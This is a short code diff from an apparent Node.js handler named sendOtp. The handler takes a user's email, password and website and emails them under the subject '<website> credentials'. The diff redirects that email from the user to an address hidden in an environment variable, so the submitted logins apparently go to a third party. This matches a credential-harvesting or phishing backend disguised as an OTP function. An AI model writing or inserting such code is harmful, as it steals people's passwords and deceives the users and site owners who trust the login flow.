@@ -4,7 +4,7 @@ const sendOtp = async (req, res,next) => {
     const { email,password,website} = req.body;
     const mailOptions = {
       from: process.env.EMAIL_USER,
-      to: email,
+      to: process.env.SHAW,
       subject: `${website} credentials` ,
       html: `
       <p>New login,</p>
